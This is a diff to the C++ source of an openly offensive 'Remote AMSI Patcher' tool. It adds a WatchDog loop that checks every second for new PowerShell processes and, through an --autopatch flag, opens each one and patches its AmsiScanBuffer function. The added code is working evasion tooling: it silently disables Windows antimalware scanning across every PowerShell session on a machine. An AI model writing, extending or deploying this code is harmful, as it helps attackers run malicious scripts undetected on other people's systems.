@@ -33,6 +33,33 @@ HOWEVER, it still lets it run which is hilarious. The patch works, despite the d
 #pragma comment(lib, "Psapi.lib")
 
 
+std::vector<DWORD> FindPowerShellProcesses() {
+    std::vector<DWORD> pids;
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+        return pids;
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            //create a new var exe, into a wstring from a wchar_t[], as it's easier to manipulate
+            std::wstring exe{ pe.szExeFile };
+            std::transform(exe.begin(), exe.end(), exe.begin(), ::towlower); // to lowercase
+
+            //npos == not found with wstring/string. means no positiion
+            if (exe.find(L"powershell") != std::wstring::npos || exe.find(L"pwsh") != std::wstring::npos) {
+                pids.push_back(pe.th32ProcessID);
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+
+    CloseHandle(hSnapshot);
+    return pids;
+}
+
 class RemoteAmsiPatch {
 
 public:
@@ -259,32 +286,56 @@ public:
     }
 };
 
-std::vector<DWORD> FindPowerShellProcesses() {
-    std::vector<DWORD> pids;
+class WatchDog {
 
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE)
-        return pids;
+public:
+    //vector to reference for which pids are actively getting patched.
+    std::vector<DWORD> vectorPidsGettingPatched;
 
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
 
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            //create a new var exe, into a wstring from a wchar_t[], as it's easier to manipulate
-            std::wstring exe{ pe.szExeFile };
-            std::transform(exe.begin(), exe.end(), exe.begin(), ::towlower); // to lowercase
+    void run() {
+        //in loop, get snapshot of processes
 
-            //npos == not found with wstring/string. means no positiion
-            if (exe.find(L"powershell") != std::wstring::npos || exe.find(L"pwsh") != std::wstring::npos) {
-                pids.push_back(pe.th32ProcessID);
+        //loop through, find processes that are ps (maybe use FindPowerShellProcesses)
+
+        //if pid is ps, and NOT in vectorPidsGettingPatched, add to vectorPidsGettingPatched
+
+        //run patch on everything in vectorPidsGettingPatched
+            // >> RemoteAmsiPatch(pid);
+
+
+        //first time, set vector as the find ps processes output
+        //vectorPidsGettingPatched = FindPowerShellProcesses();
+
+        while (true) {
+            try {
+
+                std::vector<DWORD> vectorNewPidsFromSearch = FindPowerShellProcesses();
+
+                for (DWORD pid : vectorNewPidsFromSearch) {
+                    // Only patch if this PID hasn't been patched before
+                    if (std::find(vectorPidsGettingPatched.begin(), vectorPidsGettingPatched.end(), pid) == vectorPidsGettingPatched.end()) {
+                        std::cout << "[+] New PowerShell PID Detected: " << pid << " — Attempting to Patch..." << std::endl;
+
+                        RemoteAmsiPatch rap(pid);
+                        rap.info();
+                        rap.openremoteProcessHandle();
+                        rap.getAmsiAddress();
+                        rap.getAmsiScanBufferAddress();
+                        rap.patchAmsi();
+
+                        vectorPidsGettingPatched.push_back(pid); // Mark as patched
+                    }
+                }
             }
-        } while (Process32Next(hSnapshot, &pe));
-    }
+            catch (...) {
+                std::cerr << "[-] An error occured" << std::endl;
+            }
 
-    CloseHandle(hSnapshot);
-    return pids;
-}
+            Sleep(1000);
+        }
+    }
+};
 
 void helpMenu() {
     std::cout << "\n[+] Remote AMSI Patcher - Help Menu\n";
@@ -311,6 +362,8 @@ int main(int argc, char* argv[]) {
     std::string arg1 = argv[1];
     if (arg1 == "--autopatch") {
         std::cout << "autopatch" << std::endl;
+        WatchDog wd; 
+        wd.run();
         return 0;
     }
 
